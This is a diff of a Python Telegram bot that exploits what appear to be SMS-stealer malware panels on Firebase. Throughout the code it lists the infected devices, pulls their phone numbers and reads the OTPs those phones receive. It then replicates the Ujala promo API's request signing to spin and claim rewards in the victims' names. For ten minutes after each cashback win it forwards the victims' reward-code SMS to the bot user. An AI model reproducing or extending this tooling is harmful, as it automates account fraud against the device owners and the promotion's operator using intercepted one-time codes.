@@ -2,25 +2,23 @@
 # -*- coding: utf-8 -*-
 # VIEDIET UJALA BOT (UNIFIED) - Firebase Selection & Monitoring Edition
 # ============================================================================
-# Merged bot: "main (50).py" (Reward Spin Bot) + "refer.py" (Panel Automation)
+# Merged bot: "main (50).py" (Reward Spin Bot) + Panel Automation
 #
+# USAGE IS 100% FREE - NO REFERRALS, NO POINTS, NO LIMITS
 # Users can:
-#   * Spin manually (1 point per spin, earned via referrals)
-#   * Add MANY of their OWN Firebase URLs at once (1 point per URL, paid from
-#     their points balance; the addition is confirmed before charging)
+#   * Spin as many times as they want (completely free, unlimited)
+#   * Add exactly ONE Firebase URL of their own (the only limit in the bot)
 #   * Every added panel is automatically scanned for online devices
-#   * The user SELECTS exactly ONE panel (locked forever - only admin can
-#     change it); the chosen panel is processed:
+#   * The user SELECTS their panel (it is the only one); it is processed:
 #       discover devices -> extract numbers -> OTP -> verify -> spin -> claim
 #   * After every successful claim, a 10-minute SMS monitor is spawned for
 #     that device; reward-code / Ujala SMS messages are forwarded to the user
-#   * Users CANNOT delete Firebase URLs - only admins can (via admin panel)
+#   * Users CAN delete their own Firebase URL at any time (e.g. when the
+#     panel is not active) and add a NEW one in its place
 #
-# POINTS SYSTEM (universal balance)
-#   * Every successful referral awards the referrer +3 points
-#   * 1 point = 1 spin OR 1 Firebase panel added
-#   * Adding Firebase only happens AFTER the user confirms (✅ ADD ALL) -
-#     nothing is charged on cancel
+# FIREBASE LIMIT (the only limit):
+#   * 1 Firebase panel per user
+#   * User can delete it himself and add a new one whenever he wants
 #
 # All heavy background work (panel processing, scans, SMS monitors) runs
 # through ONE FIFO JOB QUEUE with a bounded worker pool (JOB_WORKERS, default
@@ -31,9 +29,9 @@
 #   @viedietlooters  and  @NARUTOxLOOT
 #
 # Admin can:
-#   * View every Firebase URL (view-only list + details)
+#   * View every user's Firebase URL (full list + details)
 #   * DELETE any Firebase URL (with confirmation, owner gets notified)
-#   * See which panel is selected (locked) for each user
+#   * See which panel is selected for each user
 #
 # All progress is reported by EDITING a single message (no message spam).
 #
@@ -60,7 +58,6 @@ import re
 import sys
 import json
 import time
-import uuid
 import base64
 import hmac
 import random
@@ -101,9 +98,6 @@ DATA_DIR = os.environ.get("DATA_DIR", "./data").strip()
 
 PRODUCT_CODE = "8902102126232"                   # Ujala product code (hardcoded)
 GROUP_LINK = "https://t.me/viedietlooterschat"   # support group (selection changes / help)
-SPIN_COST = 1                                    # points needed per spin
-FIREBASE_COST = 1                                # points cost to add each Firebase URL
-REFERRAL_POINTS = 5                              # points earned per successful referral
 PAGE_SIZE = 10                                   # admin list pagination size
 API_RETRIES = 2                                  # max attempts for every Ujala API call
 OTP_POLL_SECONDS = 45                            # how long to poll the panel SMS node
@@ -167,9 +161,6 @@ def init_db():
                     username       TEXT,
                     first_name     TEXT,
                     registered_at  TEXT,
-                    referral_code  TEXT UNIQUE,
-                    referred_by    INTEGER,
-                    points         INTEGER DEFAULT 0,
                     channel_joined INTEGER DEFAULT 0,
                     is_admin       INTEGER DEFAULT 0,
                     last_spin      TEXT,
@@ -177,14 +168,6 @@ def init_db():
                     slots_used     INTEGER DEFAULT 0,
                     unlimited_firebase INTEGER DEFAULT 0,
                     custom_max_slots INTEGER DEFAULT -1
-                );
-
-                CREATE TABLE IF NOT EXISTS referrals (
-                    id             INTEGER PRIMARY KEY AUTOINCREMENT,
-                    referrer_id    INTEGER,
-                    referred_id    INTEGER UNIQUE,
-                    timestamp      TEXT,
-                    points_awarded INTEGER DEFAULT 0
                 );
 
                 CREATE TABLE IF NOT EXISTS spin_history (
@@ -243,23 +226,22 @@ def get_user(user_id):
             conn.close()
 
 
-def create_user(user_id, username, first_name, referred_by=None):
+def create_user(user_id, username, first_name):
     """
-    Insert a new user (IGNORE if exists) with a unique referral code.
+    Insert a new user (IGNORE if exists).
     Returns True if the user was newly created.
     """
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    ref_code = f"REF{user_id}{uuid.uuid4().hex[:6].upper()}"
     is_admin = 1 if user_id == ADMIN_ID else 0
     with _db_lock:
         conn = get_conn()
         try:
             cur = conn.execute(
                 """INSERT OR IGNORE INTO users
-                   (user_id, username, first_name, registered_at, referral_code,
-                    referred_by, points, channel_joined, is_admin)
-                   VALUES (?, ?, ?, ?, ?, ?, 0, 0, ?)""",
-                (user_id, username, first_name, now, ref_code, referred_by, is_admin),
+                   (user_id, username, first_name, registered_at, channel_joined,
+                    is_admin)
+                   VALUES (?, ?, ?, ?, 0, ?)""",
+                (user_id, username, first_name, now, is_admin),
             )
             conn.commit()
             return cur.rowcount > 0
@@ -277,138 +259,6 @@ def update_user(user_id, **fields):
             cols = ", ".join(f"{k} = ?" for k in fields)
             conn.execute(f"UPDATE users SET {cols} WHERE user_id = ?",
                          (*fields.values(), user_id))
-            conn.commit()
-        finally:
-            conn.close()
-
-
-def try_deduct_points(user_id, amount):
-    """
-    Atomically deduct `amount` points, only if balance is sufficient.
-    Returns True on success. Used so deduction only happens on success
-    (spin claim, Firebase addition, ...).
-    """
-    if amount <= 0:
-        return True
-    with _db_lock:
-        conn = get_conn()
-        try:
-            cur = conn.execute(
-                "UPDATE users SET points = points - ? WHERE user_id = ? AND points >= ?",
-                (amount, user_id, amount),
-            )
-            conn.commit()
-            return cur.rowcount > 0
-        finally:
-            conn.close()
-
-
-def add_points(user_id, amount):
-    """Add points to a user balance (admin action)."""
-    with _db_lock:
-        conn = get_conn()
-        try:
-            conn.execute("UPDATE users SET points = points + ? WHERE user_id = ?",
-                         (amount, user_id))
-            conn.commit()
-        finally:
-            conn.close()
-
-
-def remove_points(user_id, amount):
-    """Remove points from a user balance (admin action, floors at 0)."""
-    with _db_lock:
-        conn = get_conn()
-        try:
-            conn.execute("UPDATE users SET points = MAX(points - ?, 0) WHERE user_id = ?",
-                         (amount, user_id))
-            conn.commit()
-        finally:
-            conn.close()
-
-
-# ─────────────────────────── referrals ───────────────────────────
-
-def award_referral(referrer_id, referred_id):
-    """
-    Award REFERRAL_POINTS to the referrer immediately (one referral per
-    referred user - enforced by the UNIQUE constraint on referred_id).
-    Returns True when awarded, False if duplicate / referrer missing.
-    """
-    with _db_lock:
-        conn = get_conn()
-        try:
-            ref = conn.execute("SELECT user_id FROM users WHERE user_id = ?",
-                               (referrer_id,)).fetchone()
-            if not ref:
-                return False
-            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            cur = conn.execute(
-                """INSERT INTO referrals (referrer_id, referred_id, timestamp, points_awarded)
-                   VALUES (?, ?, ?, ?)""",
-                (referrer_id, referred_id, now, REFERRAL_POINTS),
-            )
-            if cur.rowcount > 0:
-                conn.execute("UPDATE users SET points = points + ? WHERE user_id = ?",
-                             (REFERRAL_POINTS, referrer_id))
-                conn.commit()
-                return True
-            return False
-        except sqlite3.IntegrityError:
-            return False  # referred_id already exists -> duplicate referral
-        finally:
-            conn.close()
-
-
-def get_referral_count(user_id):
-    """Number of successful (awarded) referrals for a user."""
-    with _db_lock:
-        conn = get_conn()
-        try:
-            row = conn.execute(
-                "SELECT COUNT(*) FROM referrals WHERE referrer_id = ? AND points_awarded > 0",
-                (user_id,),
-            ).fetchone()
-            return row[0]
-        finally:
-            conn.close()
-
-
-def get_referrals_list(user_id, limit=5):
-    """Last N referred users (user_id, name, timestamp) for display."""
-    with _db_lock:
-        conn = get_conn()
-        try:
-            rows = conn.execute(
-                """SELECT r.referred_id, u.first_name, r.timestamp
-                   FROM referrals r LEFT JOIN users u ON u.user_id = r.referred_id
-                   WHERE r.referrer_id = ? ORDER BY r.id DESC LIMIT ?""",
-                (user_id, limit),
-            ).fetchall()
-            return [dict(r) for r in rows]
-        finally:
-            conn.close()
-
-
-def award_pending_referrals_safety():
-    """
-    Safety net: any referral row still marked 0 (pending) gets awarded.
-    Normally points are awarded instantly on join, this only handles legacy rows.
-    """
-    with _db_lock:
-        conn = get_conn()
-        try:
-            pending = conn.execute(
-                "SELECT id, referrer_id FROM referrals WHERE points_awarded = 0"
-            ).fetchall()
-            for row in pending:
-                ref = conn.execute("SELECT user_id FROM users WHERE user_id = ?",
-                                   (row["referrer_id"],)).fetchone()
-                if ref:
-                    conn.execute("UPDATE users SET points = points + ? WHERE user_id = ?",
-                                 (REFERRAL_POINTS, row["referrer_id"]))
-                conn.execute("UPDATE referrals SET points_awarded = ? WHERE id = ?",
-                             (REFERRAL_POINTS, row["id"]))
             conn.commit()
         finally:
             conn.close()
@@ -487,17 +337,25 @@ def is_duplicate_firebase(user_id, firebase_url):
             conn.close()
 
 
-def add_firebase(user_id, firebase_url):
+def add_firebase(user_id, firebase_url, status="pending", summary=None):
     """Insert a new Firebase URL for a user; returns the new row id or None."""
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with _db_lock:
         conn = get_conn()
         try:
-            cur = conn.execute(
-                """INSERT INTO user_firebases (user_id, firebase_url, added_at, status)
-                   VALUES (?, ?, ?, 'pending')""",
-                (user_id, firebase_url, now),
-            )
+            if summary is not None:
+                cur = conn.execute(
+                    """INSERT INTO user_firebases (user_id, firebase_url, added_at,
+                                                   status, summary)
+                       VALUES (?, ?, ?, ?, ?)""",
+                    (user_id, firebase_url, now, status, summary),
+                )
+            else:
+                cur = conn.execute(
+                    """INSERT INTO user_firebases (user_id, firebase_url, added_at, status)
+                       VALUES (?, ?, ?, ?)""",
+                    (user_id, firebase_url, now, status),
+                )
             conn.commit()
             return cur.lastrowid
         except sqlite3.IntegrityError:
@@ -630,7 +488,7 @@ def delete_firebase(fb_id):
 # ─────────────────────── selection lock helpers ───────────────────────
 
 def get_selected_firebase(user_id):
-    """The user's currently locked SELECTED panel row, or None."""
+    """The user's currently SELECTED panel row, or None."""
     with _db_lock:
         conn = get_conn()
         try:
@@ -709,30 +567,18 @@ def get_stats():
                 "SELECT COUNT(*) FROM users WHERE channel_joined = 1"
             ).fetchone()[0]
             banned = conn.execute("SELECT COUNT(*) FROM users WHERE banned = 1").fetchone()[0]
-            total_referrals = conn.execute(
-                "SELECT COUNT(*) FROM referrals WHERE points_awarded > 0"
-            ).fetchone()[0]
             total_spins = conn.execute("SELECT COUNT(*) FROM spin_history").fetchone()[0]
             spins_today = conn.execute(
                 "SELECT COUNT(*) FROM spin_history WHERE date(spin_time) = date('now')"
             ).fetchone()[0]
-            points_awarded = conn.execute(
-                "SELECT COALESCE(SUM(points_awarded), 0) FROM referrals"
-            ).fetchone()[0]
-            points_spent = conn.execute("SELECT COUNT(*) FROM spin_history").fetchone()[0]
-            points_in_wallets = conn.execute("SELECT COALESCE(SUM(points), 0) FROM users").fetchone()[0]
             total_firebases = conn.execute("SELECT COUNT(*) FROM user_firebases").fetchone()[0]
             return {
                 "total_users": total_users,
                 "joined_today": joined_today,
                 "channel_joined": channel_joined,
                 "banned": banned,
-                "total_referrals": total_referrals,
                 "total_spins": total_spins,
                 "spins_today": spins_today,
-                "points_awarded": points_awarded,
-                "points_spent": points_spent,
-                "points_in_wallets": points_in_wallets,
                 "total_firebases": total_firebases,
             }
         finally:
@@ -748,20 +594,7 @@ def get_analytics():
             spinners = conn.execute(
                 "SELECT COUNT(DISTINCT user_id) FROM spin_history"
             ).fetchone()[0]
-            top = conn.execute(
-                """SELECT referrer_id, COUNT(*) AS cnt FROM referrals
-                   WHERE points_awarded > 0
-                   GROUP BY referrer_id ORDER BY cnt DESC LIMIT 5"""
-            ).fetchall()
-            top_list = []
-            for row in top:
-                u = conn.execute("SELECT first_name, username FROM users WHERE user_id = ?",
-                                 (row["referrer_id"],)).fetchone()
-                name = (u["first_name"] if u and u["first_name"] else "Unknown") if u else "Unknown"
-                handle = ("@" + u["username"]) if u and u["username"] else ""
-                top_list.append({"id": row["referrer_id"], "name": name, "handle": handle,
-                                 "count": row["cnt"]})
-            return {**stats, "spinners": spinners, "top_referrers": top_list}
+            return {**stats, "spinners": spinners}
         finally:
             conn.close()
 
@@ -813,7 +646,7 @@ def get_timestamp():
 
 def generate_signature_data(payload, user_key, data_key):
     """
-    Replicates the HMAC based signature from refer.py.
+    Replicates the HMAC based signature used by the Ujala API.
     Output format: base64(ts) . base64(payload) . obfuscated-signature
     """
     payload_str = json.dumps(payload, separators=(",", ":"))
@@ -960,17 +793,18 @@ def claim_reward(user_key, data_key, token):
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# 6. FIREBASE PANEL DISCOVERY & SMS OTP FETCHING  (from refer.py)
+# 6. FIREBASE PANEL DISCOVERY & SMS OTP FETCHING
 # ════════════════════════════════════════════════════════════════════════════
 
+# ─── Add more phone-number keys ──────────────────────────
 def extract_all_nums(*dicts):
-    """
-    Extract phone numbers from simDetails / DeviceInfo dicts.
-    Handles several known keys and normalizes to the last 10 digits.
-    """
     nums = []
-    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
-                     "mobNo", "phoneNumber", "phone", "mobile"]
+    keys_to_check = [
+        "sim1Number", "sim2Number", "numberSim1", "numberSim2",
+        "mobNo", "phoneNumber", "phone", "mobile",
+        "sim1", "sim2", "number1", "number2", "mobileNumber",
+        "sim1No", "sim2No", "mob", "phoneNo"
+    ]
     for d in dicts:
         if not isinstance(d, dict):
             continue
@@ -981,67 +815,122 @@ def extract_all_nums(*dicts):
                 nums.append(clean[-10:])
     return list(set(nums))
 
+# ─── Try multiple paths ──────────────────────────────
+def fb_get_first(base_url, path_list, timeout=8):
+    for path in path_list:
+        try:
+            r = requests.get(f"{base_url}/{path}.json", timeout=timeout)
+            if r.status_code == 200:
+                data = r.json()
+                if isinstance(data, dict) and data:
+                    return path, data
+        except Exception:
+            continue
+    return None, None
 
-def fb_get_sync(base_url, path, timeout=8):
-    """Synchronous Firebase GET (returns dict or None)."""
-    try:
-        r = requests.get(f"{base_url}/{path}.json", timeout=timeout)
-        if r.status_code != 200:
-            return None
-        data = r.json()
-        return data if isinstance(data, dict) else None
-    except Exception:
-        return None
-
-
-async def _fb_get_aio(session, base_url, path, timeout=8):
-    """Asynchronous Firebase GET used by the aiohttp path."""
-    try:
-        async with session.get(f"{base_url}/{path}.json",
-                               timeout=aiohttp.ClientTimeout(total=timeout)) as r:
-            if r.status != 200:
-                return None
-            data = await r.json(content_type=None)
-            return data if isinstance(data, dict) else None
-    except Exception:
-        return None
-
-
-async def _check_panel_active_aio(url):
-    """Async version of check_panel_active (aiohttp, mirrors refer.py)."""
-    connector = aiohttp.TCPConnector(limit=20, ttl_dns_cache=300)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        sim_all, device_info_all = await asyncio.gather(
-            _fb_get_aio(session, url, "All_Users/simDetails"),
-            _fb_get_aio(session, url, "All_Users/Data/DeviceInfo"),
-            return_exceptions=True,
-        )
-    return _build_panel_report(url, sim_all, device_info_all)
-
-
-def _check_panel_active_sync(url):
-    """Synchronous fallback of check_panel_active (plain requests)."""
-    sim_all = fb_get_sync(url, "All_Users/simDetails")
-    device_info_all = fb_get_sync(url, "All_Users/Data/DeviceInfo")
-    return _build_panel_report(url, sim_all, device_info_all)
-
-
-def _build_panel_report(url, sim_all, device_info_all):
+def check_panel_active(url):
     """
-    Shared logic: given simDetails + DeviceInfo, build the report dict of
-    online devices with their numbers (or None if the panel is unusable).
+    Discover online devices by probing multiple known paths.
+    Returns a report dict or None.
     """
-    if not isinstance(sim_all, dict) or not sim_all:
+    # 1) Try to get the root keys to understand the structure
+    root_data = None
+    try:
+        r = requests.get(f"{url}/.json", timeout=8)
+        if r.status_code == 200:
+            root_data = r.json()
+    except:
+        pass
+
+    sim_path = None
+    device_path = None
+    sim_data = None
+    device_data = None
+
+    if isinstance(root_data, dict):
+        # Look for common top-level keys
+        if "All_Users" in root_data and isinstance(root_data["All_Users"], dict):
+            all_users = root_data["All_Users"]
+            # Try inside All_Users
+            if "simDetails" in all_users:
+                sim_path = "All_Users/simDetails"
+                sim_data = all_users["simDetails"]
+            elif "sim" in all_users:
+                sim_path = "All_Users/sim"
+                sim_data = all_users["sim"]
+            elif "simDetails" in all_users:
+                sim_path = "All_Users/simDetails"
+                sim_data = all_users["simDetails"]
+            if "Data" in all_users and isinstance(all_users["Data"], dict):
+                if "DeviceInfo" in all_users["Data"]:
+                    device_path = "All_Users/Data/DeviceInfo"
+                    device_data = all_users["Data"]["DeviceInfo"]
+                elif "deviceInfo" in all_users["Data"]:
+                    device_path = "All_Users/Data/deviceInfo"
+                    device_data = all_users["Data"]["deviceInfo"]
+        else:
+            # Root-level simDetails or DeviceInfo
+            if "simDetails" in root_data:
+                sim_path = "simDetails"
+                sim_data = root_data["simDetails"]
+            elif "sim" in root_data:
+                sim_path = "sim"
+                sim_data = root_data["sim"]
+            elif "devices" in root_data:
+                sim_path = "devices"
+                sim_data = root_data["devices"]
+            if "DeviceInfo" in root_data:
+                device_path = "DeviceInfo"
+                device_data = root_data["DeviceInfo"]
+            elif "deviceInfo" in root_data:
+                device_path = "deviceInfo"
+                device_data = root_data["deviceInfo"]
+
+    # 2) If still not found, use a list of fallback paths
+    if sim_data is None:
+        fallback_sim = [
+            "All_Users/simDetails",
+            "All_Users/sim",
+            "simDetails",
+            "sim",
+            "devices",
+            "All_Users/devices"
+        ]
+        found_path, sim_data = fb_get_first(url, fallback_sim)
+        if found_path:
+            sim_path = found_path
+
+    if device_data is None:
+        fallback_device = [
+            "All_Users/Data/DeviceInfo",
+            "All_Users/Data/deviceInfo",
+            "All_Users/DeviceInfo",
+            "DeviceInfo",
+            "deviceInfo",
+            "All_Users/devicesInfo"
+        ]
+        found_path, device_data = fb_get_first(url, fallback_device)
+        if found_path:
+            device_path = found_path
+
+    # If we still don't have sim_data, give up
+    if not sim_data:
         return None
-    info_all = device_info_all if isinstance(device_info_all, dict) else {}
+
+    # Build the report
+    info_all = device_data if isinstance(device_data, dict) else {}
     online_devices = []
-    for dev_id, sim in sim_all.items():
+    for dev_id, sim in sim_data.items():
         info = info_all.get(dev_id) or {}
         status = str(info.get("Status", "")).lower()
         if status == "online":
             nums = extract_all_nums(sim, info)
             if nums:
-                online_devices.append({"id": dev_id, "numbers": nums, "status": "online"})
+                online_devices.append({
+                    "id": dev_id,
+                    "numbers": nums,
+                    "status": "online"
+                })
     if not online_devices:
         return None
     total_nums = sum(len(d["numbers"]) for d in online_devices)
@@ -1051,20 +940,6 @@ def _build_panel_report(url, sim_all, device_info_all):
         "total_devices": len(online_devices),
         "total_numbers": total_nums,
     }
-
-
-def check_panel_active(url):
-    """
-    Discover online devices for one Firebase panel URL.
-    Uses the fast aiohttp path when available, else the sync requests path.
-    Returns a report dict or None.
-    """
-    if HAS_AIOHTTP:
-        try:
-            return asyncio.run(_check_panel_active_aio(url))
-        except Exception as e:
-            logger.error("async panel check failed for %s: %s (falling back)", url, e)
-    return _check_panel_active_sync(url)
 
 
 def fetch_otp_from_sms(panel_url, device_id, timeout=OTP_POLL_SECONDS):
@@ -1138,6 +1013,8 @@ def _dispatch_job(kind, args):
         process_firebase_job(*args)
     elif kind == "scan":
         scan_firebases_and_present(*args)
+    elif kind == "check":
+        check_firebases_and_confirm(*args)
     elif kind == "monitor":
         start_user_sms_monitor(*args)
 
@@ -1187,20 +1064,26 @@ def _monitor_dec(fb_id):
             _monitor_counts[fb_id] = c
 
 
-def start_user_sms_monitor(panel_url, device_id, mobile, fb_id, user_id, duration=600):
+def start_user_sms_monitor(panel_url, device_id, mobile, fb_id, user_id,
+                           reward=None, duration=600):
     """
-    Background thread (one per successfully claimed number): polls the panel's
-    SMS node (All_Users/sms/{device_id}) every 3 s for `duration` seconds.
-    When a NEW SMS contains a reward code ("Reward Code: ...") or Ujala
-    keywords (BigCity / Ujala / Onam), the FULL SMS is forwarded to the
-    panel owner's chat. Never blocks the bot (daemon thread).
+    Background thread (one per successfully claimed CASHBACK number): polls
+    the panel's SMS node (All_Users/sms/{device_id}) every 3 s for
+    `duration` seconds (10 min). When a NEW SMS contains a reward code
+    ("Reward Code: ...") or Ujala keywords (BigCity / Ujala / Onam), the
+    FULL SMS is forwarded to the panel owner's chat.
+    Never blocks the bot (daemon thread).
     """
     _monitor_inc(fb_id)
+    reward_line = ""
+    if reward:
+        reward_line = f"🎁 <b>{escape(str(reward))}</b>\n"
     try:
         bot.send_message(
             user_id,
             f"🔍 <b>Monitor Started</b>\n"
             f"📱 <code>{mobile}</code>\n"
+            f"{reward_line}"
             f"🆔 <code>{device_id}</code>\n"
             f"⏱️ {duration // 60} min\n"
             f"{FOOTER}",
@@ -1235,6 +1118,11 @@ def start_user_sms_monitor(panel_url, device_id, mobile, fb_id, user_id, duratio
                                    or sms_value.get("text") or "")
                         reward_match = re.search(r"Reward Code[^:]*:\s*([A-Za-z0-9]+)",
                                                  body, re.IGNORECASE)
+                        if not reward_match:
+                            # Format without colon, e.g. "Reward Code for Ujala
+                            # Onam Consumer promo is X37VHDCFK6BC"
+                            reward_match = re.search(
+                                r"Reward Code[^.\n]*?\b([A-Z0-9]{8,})\b", body, re.I)
                         is_ujala = any(k in body for k in ["BigCity", "Ujala", "Onam"])
                         if reward_match or is_ujala:
                             try:
@@ -1330,6 +1218,17 @@ _STATUS_LABEL = {
     "spin_failed": "❌ Spin failed",
     "claim_failed": "⚠️ Claim failed",
 }
+
+
+def is_cashback_reward(reward):
+    """
+    True when the spin reward is a cashback (the 10-minute SMS monitor is
+    only started for cashback winners - the reward-code SMS
+    arrives on the phone afterwards and must be captured).
+    """
+    if not reward:
+        return False
+    return "cashback" in str(reward).lower()
 
 
 def progress_edit(chat_id, message_id, text, reply_markup=None):
@@ -1467,19 +1366,23 @@ def _run_firebase_job(fb_id, chat_id, message_id):
             )
             results.append(res)
 
-            # ── Per-number SMS monitoring ────────────────────────────
-            # Every successful claim queues its own 10-minute monitor
-            # job for that device ID; it forwards reward-code / Ujala
-            # SMS straight to the panel owner's chat. Monitors run in
-            # the shared queue so thread count stays bounded.
-            if res["status"] == "Success":
+            # ── Per-number SMS monitoring ─────────────────────────────
+            # Only CASHBACK winners get the 10-minute SMS monitor: the
+            # reward-code SMS ("Congratulations! Your Reward Code for Ujala
+            # Onam Consumer promo is XXXX...") arrives on the phone shortly
+            # after the claim and must be captured + forwarded to the owner.
+            # Monitors run in the shared queue so thread count stays bounded.
+            if res["status"] == "Success" and is_cashback_reward(res.get("reward")):
                 _enqueue_job("monitor",
-                             (firebase_url, device_id, mobile, fb_id, chat_id))
+                             (firebase_url, device_id, mobile, fb_id, chat_id,
+                              res.get("reward")))
                 monitors_started += 1
 
             body = "\n".join(f"• <code>{r['number']}</code> → "
                              f"{_STATUS_LABEL.get(r['status'], r['status'])}"
                              + (f" 🎁 {escape(str(r['reward']))}" if r["reward"] else "")
+                             + (" 📡" if (r["status"] == "Success"
+                                          and is_cashback_reward(r.get("reward"))) else "")
                              for r in results[-12:])
             text = (
                 f"🔥 <b>PROCESSING FIREBASE</b>\n"
@@ -1501,6 +1404,7 @@ def _run_firebase_job(fb_id, chat_id, message_id):
     if success:
         winners = "\n".join(
             f"• <code>{escape(r['number'])}</code> → {escape(str(r['reward']))}"
+            + (" 📡" if is_cashback_reward(r.get("reward")) else "")
             for r in success[:10]
         )
     else:
@@ -1510,7 +1414,7 @@ def _run_firebase_job(fb_id, chat_id, message_id):
         f"📱 Processed: <b>{len(results)}</b>",
         f"✅ Success: <b>{len(success)}</b>",
         f"❌ Failed: <b>{len(failed)}</b>",
-        f"🛰️ Monitors started: <b>{monitors_started}</b>",
+        f"🛰️ Cashback monitors started: <b>{monitors_started}</b>",
     ]
     summary = "\n".join(summary_lines)
 
@@ -1642,8 +1546,6 @@ def main_menu_keyboard(user):
     """Main menu buttons; admin gets an extra ADMIN PANEL button."""
     kb = InlineKeyboardMarkup(row_width=2)
     kb.row(btn("🎡 SPIN NOW", callback_data="spin_now"))
-    kb.row(btn("👥 MY REFERRALS", callback_data="my_referrals"),
-           btn("🔗 REFERRAL LINK", callback_data="referral_link"))
     kb.row(btn("📁 ADD FIREBASE", callback_data="add_firebase"),
            btn("📂 MY FIREBASE", callback_data="my_firebase"))
     kb.row(btn("📊 MY HISTORY", callback_data="my_history"),
@@ -1655,16 +1557,14 @@ def main_menu_keyboard(user):
 
 def main_menu_text(user, first_name):
     name = escape(first_name or "User")
-    points = user["points"] if user else 0
     return (
         f"🎡 <b>VIEDIET UJALA BOT</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👋 Welcome, <b>{name}</b>!\n"
-        f"💎 Your Points: <b>{points}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎡 Each spin costs <b>1 point</b>\n"
-        f"📁 Each Firebase panel costs <b>1 point</b>\n"
-        f"👥 Each referral gives <b>+{REFERRAL_POINTS} points</b>\n"
+        f"🎡 Spins are <b>100% FREE</b> & unlimited!\n"
+        f"📁 Firebase limit: <b>1 panel</b> per user\n"
+        f"   (you can delete it & add a new one anytime)\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Spin the wheel and win exciting rewards! 🎉\n"
         f"{FOOTER}"
@@ -1722,9 +1622,8 @@ _state_lock = threading.RLock()
 spin_sessions = {}       # user_id -> {step, user_key, data_key, phone}
 admin_states = {}        # user_id -> {type, target}
 broadcast_msgs = {}      # user_id -> text awaiting confirmation
-admin_confirm_pts = {}   # user_id -> {action, target, amount}
 firebase_states = {}     # user_id -> {"step": "awaiting_url"}
-firebase_confirmations = {}  # user_id -> {"urls": [...], "dupes": [...], "cost": N}
+firebase_confirmations = {}  # user_id -> {"entries": [...], "dupes": [...], "_ts": t}
 
 
 def clear_state(user_id):
@@ -1733,7 +1632,6 @@ def clear_state(user_id):
         spin_sessions.pop(user_id, None)
         admin_states.pop(user_id, None)
         broadcast_msgs.pop(user_id, None)
-        admin_confirm_pts.pop(user_id, None)
         firebase_states.pop(user_id, None)
         firebase_confirmations.pop(user_id, None)
 
@@ -1748,99 +1646,37 @@ def is_admin(user):
 # ════════════════════════════════════════════════════════════════════════════
 
 def send_help(chat_id, message_id=None, edit=True):
-    """HELP menu: how to earn points, how to spin, how to add Firebase."""
+    """HELP menu: how to spin, how to add / manage your single Firebase."""
     text = (
         f"🆘 <b>HELP</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎡 <b>HOW TO SPIN</b>\n"
-        f"1️⃣ Press <b>SPIN NOW</b> (costs 1 point)\n"
+        f"🎡 <b>HOW TO SPIN</b> (FREE, unlimited)\n"
+        f"1️⃣ Press <b>SPIN NOW</b>\n"
         f"2️⃣ Enter your 10 digit mobile number\n"
         f"3️⃣ Enter the OTP received via SMS\n"
         f"4️⃣ Watch the wheel spin! 🎉\n\n"
-        f"👥 <b>HOW TO EARN POINTS</b>\n"
-        f"• Share your referral link with friends\n"
-        f"• Each friend who joins gives <b>+{REFERRAL_POINTS} points</b>\n\n"
-        f"📁 <b>HOW TO ADD FIREBASE</b>\n"
-        f"1️⃣ Press <b>ADD FIREBASE</b> (costs <b>1 point</b> per URL)\n"
-        f"2️⃣ Send <b>one URL per line</b> (bulk allowed!), e.g.\n"
+        f"📁 <b>HOW TO ADD FIREBASE</b> (1 panel limit)\n"
+        f"1️⃣ Press <b>ADD FIREBASE</b>\n"
+        f"2️⃣ Send your URL, e.g.\n"
         f"   <code>https://panel-name-default-rtdb.firebaseio.com</code>\n"
-        f"3️⃣ The bot validates the URLs and shows a <b>confirmation</b>\n"
-        f"4️⃣ Tap <b>✅ ADD ALL</b> — points are deducted and the bot scans every URL\n"
-        f"5️⃣ Pick a panel with the <b>SELECT</b> button to process it\n"
+        f"3️⃣ The bot <b>checks</b> it and shows how many "
+        f"<b>devices</b> and <b>numbers</b> it has\n"
+        f"4️⃣ Confirm <b>✅ ADD</b> to save it\n"
+        f"5️⃣ Pick the panel with the <b>SELECT</b> button to process it\n"
         f"6️⃣ After each claim, a <b>10-minute SMS monitor</b> watches "
         f"that device and forwards reward-code SMS to you\n\n"
-        f"🔒 <b>SELECTED PANEL IS LOCKED</b> — you cannot delete or change it "
-        f"yourself. Contact admin to change it.\n\n"
+        f"🗑️ <b>LIMIT & DELETE</b>\n"
+        f"• Only <b>1 panel</b> per user\n"
+        f"• If your panel is not working, go to <b>MY FIREBASE</b> and "
+        f"<b>DELETE</b> it yourself, then add a new one\n\n"
         f"🎁 <b>POSSIBLE REWARDS</b>\n"
         f"• 💰 Cashback rewards\n"
         f"• 🎫 Coupons & vouchers\n"
         f"• 🎁 Mystery prizes\n\n"
-        f"💡 One spin = 1 point. No daily limit!\n"
+        f"💡 No points, no referrals — everything is free!\n"
         f"{FOOTER}"
     )
     markup = back_markup()
-    if edit and message_id:
-        safe_edit(chat_id, message_id, text, markup)
-    else:
-        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
-
-
-def send_referral_link(chat_id, message_id=None, edit=True):
-    """Referral link menu with share button + referral stats."""
-    user = get_user(chat_id)
-    if not user:
-        return
-    bot_username = bot.get_me().username
-    link = f"https://t.me/{bot_username}?start=ref_{chat_id}"
-    count = get_referral_count(chat_id)
-    points_earned = count * REFERRAL_POINTS
-    refs = get_referrals_list(chat_id)
-    ref_text = "\n".join(
-        f"• {escape(r['first_name'] or 'User')} — {r['timestamp']}"
-        for r in refs
-    ) or "• No referrals yet"
-
-    text = (
-        f"🔗 <b>YOUR REFERRAL LINK</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📤 Share this link with friends:\n"
-        f"<code>{escape(link)}</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👥 Successful referrals: <b>{count}</b>\n"
-        f"💎 Points earned: <b>{points_earned}</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
